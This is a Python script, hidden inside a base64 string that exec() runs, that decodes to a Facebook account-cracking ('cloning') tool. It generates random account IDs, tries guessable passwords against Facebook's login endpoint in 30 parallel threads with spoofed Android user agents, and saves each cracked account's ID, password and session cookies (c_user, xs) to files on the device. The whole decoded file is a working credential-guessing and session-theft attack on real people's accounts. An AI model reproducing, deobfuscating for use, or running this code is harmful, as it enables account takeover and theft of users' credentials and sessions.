import base64
exec(base64.b64decode('I1M5VVI5QkgNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBqc29uDQppbXBvcnQgdXVpZA0KaW1wb3J0IHN0cmluZw0KaW1wb3J0IHJhbmRvbSxwbGF0Zm9ybSxzdWJwcm9jZXNzLGhhc2hsaWINCmltcG9ydCByZXF1ZXN0cyxyZSx0aW1lDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRyZWQNCmNsYXNzIE1yX0NvZGU6DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmxvb3AgPSAwDQogICAgICAgIHNlbGYub2tzID0gW10NCiAgICAgICAgc2VsZi5jcHMgPSBbXQ0KICAgICAgICBzZWxmLmdlbiA9IFtdICAgICAgICANCiAgICANCiAgICBkZWYgYmFubmVyKHNlbGYpOg0KICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIiBpZiBvcy5uYW1lICE9ICJudCIgZWxzZSAiY2xzIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN20iKQ0KICAgICAgICBwcmludCgiICAgIC5kOGIgICBkYiAgICBkYiAuZDg4ODggICIpDQogICAgICAgIHByaW50KCIgICBkOCcgYDhiIGA4YiAgZDgnIDg4JyAgWVAgICAiKQ0KICAgICAgICBwcmludCgiICAgODhvb284OCAgYDhiZDgnICBgOGJvICAgICAiKQ0KICAgICAgICBwcmludCgiICAgODh+fn44OCAgLmRQWWIgICAgIGBZOGIgICAgICIpDQogICAgICAgIHByaW50KCIgICA4OCAgIDg4IC44UCAgWTggIGRiICAgOEQgICAiKQ0KICAgICAgICBwcmludCgiICAgWVAgICBZUCBZUCAgICBZUCBgODg4OFknIFwwMzNbMTszMm1TNFVSNEJIIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMzg7NTsyNTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVRvb2wgT3duZXIgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzdtU2F1cmFiaCBLdW1hciBNZWVuYSIpDQogICAgICAgIHByaW50KCJcMDMzWzE7MzJtICAaIFwwMzNbMTszN21HaXRIdWIgICAgIFwwMzNbMzg7NTsyMDhtGiAgXDAzM1sxOzM3bWh0dHBzOi8vZ2l0aHViLmNvbS9CQUJVLVhEIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVR5cGUgICAgICAgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzdtUmFuZG9tIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVZlcnNpb24gICAgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzltWzEuMPCfpotdIikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgIyBkZWYgbWV0aG9kKHNlbGYsIHVpZCwgcGFzc2xpc3QpOg0KICAgICMgICAgIGZvciBwdyBpbiBwYXNzbGlzdDoNCiAgICAjICAgICAgICAgIyBEdW1teSBzaW11bGF0aW9uIO+/vSByZXBsYWNlIHdpdGggYWN0dWFsIGxvZ2luIGxvZ2ljDQogICAgIyAgICAgICAgIHByaW50KGYiW1RSWUlOR10ge3VpZH0gfCB7cHd9IikNCiAgICAjICAgICAgICAgaWYgcHcuZW5kc3dpdGgoIjAwIik6ICAjIFNpbXVsYXRlZCAiT0siIGNvbmRpdGlvbg0KICAgICMgICAgICAgICAgICAgcHJpbnQoZiJbT0tdIHt1aWR9IHwge3B3fSIpDQogICAgIyAgICAgICAgICAgICBzZWxmLm9rcy5hcHBlbmQodWlkKQ0KICAgICMgICAgICAgICAgICAgYnJlYWsNCiAgICAjICAgICAgICAgZWxzZToNCiAgICAjICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgIyAgICAgZWxzZToNCiAgICAjICAgICAgICAgcHJpbnQoZiJbQ1BdIHt1aWR9IHwge3Bhc3NsaXN0WzBdfSIpDQogICAgIyAgICAgICAgIHNlbGYuY3BzLmFwcGVuZCh1aWQpDQogICAgZGVmIE1haW4oc2VsZik6DQogICAgICAgIHNlbGYuYmFubmVyKCkNCiAgICAgICAgY29kZSA9IGlucHV0KCIgICBDaG9vc2UgQ29kZSAtICAiKS5zdHJpcCgpDQogICAgICAgIGxpbWl0ID0gaW50KGlucHV0KCIgICBZb3VyIExpbWl0ICAtICAiKS5zdHJpcCgpKQ0KICAgICAgICBwcmludCgi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICAgICAgcmFuZF82ZGlnaXQgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNikpDQogICAgICAgICAgICBzZWxmLmdlbi5hcHBlbmQocmFuZF82ZGlnaXQpDQogICAgICAgIHByaW50KCIgICBUVVJOIE9OL09GRiBGTElHSFQgTU9ERVxuIikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgZXhlY3V0b3I6DQogICAgICAgICAgICBmb3IgbnVtYmVyIGluIHNlbGYuZ2VuOg0KICAgICAgICAgICAgICAgIHVpZCA9IGNvZGUgKyBudW1iZXINCiAgICAgICAgICAgICAgICBwYXNzbGlzdCA9IFt1aWRbOjZdLCB1aWQsIHVpZFs6OF0sIG51bWJlcls6Nl0sICI1NzI3MzIwMCJdDQogICAgICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHNlbGYubWV0aG9kLCB1aWQsIHBhc3NsaXN0KQ0KDQogICAgICAgIHByaW50KCJcbkNMT05JTkcgQ09NUExFVEUuIikNCiAgICAgICAgcHJpbnQoZiJUT1RBTCBPSzoge2xlbihzZWxmLm9rcyl9IikNCiAgICAgICAgcHJpbnQoZiJUT1RBTCBDUDoge2xlbihzZWxmLmNwcyl9IikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgDQogICAgZGVmIG1ldGhvZChzZWxmLGlkcyxwYXNzbGlzdCk6DQogICAgICAgIGdsb2JhbCBsb29wLG9rcyxjcHMNCiAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAjZyA9IHJhbmRvbS5jaG9pY2Uoc2Ftc3VuZ191c2VyX2FnZW50KCkpDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcclxyXHgxYlttICAgQVhTfHtzZWxmLmxvb3B9fE9LOi17bGVuKHNlbGYub2tzKX18Q1A6LXtsZW4oc2VsZi5jcHMpfSIpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcGFzIGluIHBhc3NsaXN0Og0KICAgICAgICAgICAgICAgIGJhbCA9ICJodHRwczovL3RvdWNoLmZhY2Vib29rLmNvbS8iDQogICAgICAgICAgICAgICAgYm9yb19iYXJhID0gc2Vzc2lvbi5nZXQoYmFsKQ0KICAgICAgICAgICAgICAgIGxvZGFfTGVnYSA9IHsnbV90cyc6IHJlLnNlYXJjaChyJ25hbWU9Im1fdHMiIHZhbHVlPSIoLio/KSInLCBzdHIoYm9yb19iYXJhLnRleHQpKS5ncm91cCgxKSwgJ2xpJzogcmUuc2VhcmNoKHInbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoYm9yb19iYXJhLnRleHQpKS5ncm91cCgxKSwgJ3RyeV9udW1iZXInOiAnMCcsICd1bnJlY29nbml6ZWRfdHJpZXMnOiAnMCcsICdlbWFpbCc6IGlkcywgJ3ByZWZpbGxfY29udGFjdF9wb2ludCc6ICcnLCAncHJlZmlsbF9zb3VyY2UnOiAnJywgJ3ByZWZpbGxfdHlwZSc6ICcnLCAnZmlyc3RfcHJlZmlsbF9zb3VyY2UnOiAnJywgJ2ZpcnN0X3ByZWZpbGxfdHlwZSc6ICcnLCAnaGFkX2NwX3ByZWZpbGxlZCc6ICdmYWxzZScsICdoYWRfcGFzc3dvcmRfcHJlZmlsbGVkJzogJ2ZhbHNlJywgJ2lzX3NtYXJ0X2xvY2snOiAnZmFsc2UnLCAnYmlfeHJ3aCc6ICcwJywgJ2VuY3Bhc3MnOiAiI1BXRF9CUk9XU0VSOjA6e306e30iLmZvcm1hdChpbnQodGltZS50aW1lKCkpLCBwYXMpLCAnYmlfd3ZkcCc6ICcnLCAnZmJfZHRzZyc6ICcnLCAnamF6b2VzdCc6IHJlLnNlYXJjaChyJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoYm9yb19iYXJhLnRleHQpKS5ncm91cCgxKSwgJ2xzZCc6IHJlLnNlYXJjaChyJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihib3JvX2JhcmEudGV4dCkpLmdyb3VwKDEpLCAnX19keW4nOiAnJywgJ19fY3NyJzogJycsICdfX3JlcSc6IHJhbmRvbS5jaG9pY2UobGlzdCgiMDEyMzQ1Njc4OSIpKSwgJ19fZm10JzogJzAnLCAnX19hJzogJycsICdfX3VzZXInOiAnMCd9DQogICAgICAgICAgICAgICAgYWNoaGEgPSB7DQogICAgICAgICAgICAgICAgJ2F1dGhvcml0eSc6ICd3ZWIuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICAgICAnbWV0aG9kJzogJ1BPU1QnLA0KICAgICAgICAgICAgICAgICdwYXRoJzogJy9sb2dpbi8/cHJpdmFjeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelU0TWpVM01USXlMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCcsDQogICAgICAgICAgICAgICAgJ3NjaGVtZSc6ICdodHRwcycsDQogICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcnLA0KICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnSS1UVywgTi1TRTtxPTAuNiwgLS1WRTtxPTAuOScsDQogICAgICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQogICAgICAgICAgICAgICAgJ2Rwcic6ICczJywNCiAgICAgICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd2ViLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tLz9fcmRjPTEmX3JkcicsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdsaWdodCcsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciR29vZ2xlIENocm9tZSI7dj0iMTQxIiwgIk5vdD9BX0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNDEiJywNCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyJOb3QgQShCcmFuZCI7dj0iMjQuMC4wLjAiLCAiQ2hyb21pdW0iO3Y9IjUzMC4wLjAuNDguNzQiJywNCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2RlbCc6ICciIicsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciTGludXgiJywNCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAnIiInLA0KICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsDQogICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywNCiAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLA0KICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsDQogICAgICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBpcW9vX3VzZXJfYWdlbnQoKSwNCiAgICAgICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnMjcwNScsfQ0KICAgICAgICAgICAgICAgIG1lUmFfTGluayA9ICJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZmbCZsb2dpbl9mcm9tX2F5bWg9MSZyZWZpZD04Ig0KICAgICAgICAgICAgICAgIHNlc3Npb24ucG9zdCh1cmw9bWVSYV9MaW5rLGRhdGE9bG9kYV9MZWdhLGhlYWRlcnM9YWNoaGEpDQogICAgICAgICAgICAgICAgbG9nX2Nvb2tpZXMgPSBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkNCiAgICAgICAgICAgICAgICBpZiAiY191c2VyIiBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICAgICAga3VraSA9ICI7Ii5qb2luKFtmIntrZXl9PXtzZXNzaW9uLmNvb2tpZXMuZ2V0KGtleSl9IiBmb3Iga2V5IGluIFsnZGF0cicsICdmcicsICdzYicsICdjX3VzZXInLCAneHMnXV0pDQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSByZS5maW5kYWxsKCdjX3VzZXI9KC4qKTt4cycsIGt1a2kpWzBdDQogICAgICAgICAgICAgICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1c2VyfS9waWN0dXJlP3R5cGU9bm9ybWFsIikudGV4dA0KICAgICAgICAgICAgICAgICAgICBpZiAiUGhvdG9zaG9wIiBpbiByZXE6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxyXHJceDFiWzM4OzU7NDZtT0sg4oCiIHt1c2VyfSDigKIge3Bhc30iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzM4OzU7MjIwbUNvb2tpZXM6XDAzM1swbSB7a3VraX0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiL3NkY2FyZC9BWFMtT0sudHh0IiwgImEiKS53cml0ZSh1c2VyICsgInwiICsgcGFzICsgInwiICsga3VraSArICJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLm9rcy5hcHBlbmQodXNlcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAiY2hlY2twb2ludCIgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgICAgIG9wZW4oIi9zZGNhcmQvQVhTLUNQLnR4dCIsICJhIikud3JpdGUoaWRzICsgInwiICsgcGFzICsgIlxuIikNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcHMuYXBwZW5kKGlkcykNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgc2VsZi5sb29wICs9IDENCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgICAgIHBhc3MNCiAgIA0KaXFvb191c2VyX2FnZW50PVtdDQppbXBvcnQgcmFuZG9tDQpkZWYgaXFvb191c2VyX2FnZW50KCk6DQogICAgYW5kcm9pZF92ZXJzaW9ucz1bIjExIiwiMTIiLCIxMyIsIjE0Il0NCiAgICBpcW9vX21vZGVscz1bIlYyMjMwIiwiVjIyMzgiLCJWMjI0MyIsIlYyMjU0IiwiVjIyNTkiLCJWMjI2NSIsIlYyMjcxIiwiVjIyNzkiLCJWMjI4MyIsIlYyMjkwIiwiVjIyOTkiLCJWMjMwMyIsIlYyMzA3IiwiVjIzMTEiLCJWMjMxNCIsIlYyMzE5IiwiVjIzMjMiLCJWMjMyOSIsIlYyMzMxIl0NCiAgICBjaHJvbWU9ZiJ7cmFuZG9tLnJhbmRpbnQoMTEwLDEyNSl9LjAue3JhbmRvbS5yYW5kaW50KDQwMDAsNjk5OSl9LntyYW5kb20ucmFuZGludCgxMDAsMTk5KX0iDQogICAgYnVpbGQ9cmFuZG9tLmNob2ljZShbIlJQMUEiLCJSS1ExIiwiU0QxQSIsIlRQMUEiLCJVUDFBIl0pK3N0cihyYW5kb20ucmFuZGludCgxMDAsOTk5KSkNCiAgICByZXR1cm4gZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge3JhbmRvbS5jaG9pY2UoYW5kcm9pZF92ZXJzaW9ucyl9OyB7cmFuZG9tLmNob2ljZShpcW9vX21vZGVscyl9IEJ1aWxkL3tidWlsZH0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS97Y2hyb21lfSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIgDQogICAgcmV0dXJuIHVhDQojIFN0YXJ0IHRoZSBzY3JpcHQNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgTXJfQ29kZSgpLk1haW4oKQ==').decode())